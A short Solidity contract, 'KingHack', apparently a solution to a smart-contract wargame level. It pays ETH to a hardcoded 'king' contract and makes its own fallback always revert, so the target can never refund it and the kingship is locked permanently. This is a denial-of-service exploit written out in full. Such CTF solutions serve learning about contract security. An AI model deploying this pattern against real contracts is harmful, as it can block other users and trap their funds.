// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract KingHack {
    address payable king = 0x5179C0F42c6119a5be5ccfF532ff7A83894E5266;

    function transferETH() public payable {
        (bool success, ) = king.call{value: msg.value}("");
        require(success);
    }

    fallback() external {
        revert();
    }
}
